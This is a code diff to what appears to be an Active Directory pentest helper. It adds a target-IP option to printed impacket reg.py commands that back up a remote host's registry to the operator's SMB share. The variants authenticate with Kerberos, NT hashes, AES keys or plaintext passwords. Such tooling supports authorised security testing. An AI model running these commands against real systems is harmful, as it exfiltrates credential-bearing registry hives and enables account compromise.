@@ -954,6 +954,7 @@ class x_RegBackup(Action):
     def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
         v = vars(glob, parent, target,
             ip=f'{Fore.RED}YOUR_IP{Style.RESET_ALL}',
+            target_ip=f'{Fore.RED}TARGET_IP{Style.RESET_ALL}',
             plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')
 
         comment = "Find an accessible share or create yours:"
@@ -968,13 +969,13 @@ class x_RegBackup(Action):
         ]
 
         if parent.krb_auth:
-            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -k -no-pass backup -o '\\\\{ip}\\share'"
+            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} -k -no-pass backup -o '\\\\{ip}\\share'"
         elif parent.secret_type == c.SECRET_NTHASH:
-            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -hashes :{parent.secret} backup -o '\\\\{ip}\\share'"
+            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} -hashes :{parent.secret} backup -o '\\\\{ip}\\share'"
         elif parent.secret_type == c.SECRET_AESKEY:
-            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -k -aesKey {parent.secret} backup -o '\\\\{ip}\\share'"
+            cmd = "reg.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} -k -aesKey {parent.secret} backup -o '\\\\{ip}\\share'"
         elif parent.secret_type == c.SECRET_PASSWORD:
-            cmd = "reg.py '{fqdn}/{parent.obj.name}:{parent.secret}@{target_no_dollar}' -dc-ip {dc_ip} backup -o '\\\\{ip}\\share'"
+            cmd = "reg.py '{fqdn}/{parent.obj.name}:{parent.secret}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip} backup -o '\\\\{ip}\\share'"
 
         print_line(comment, cmd, v)
 
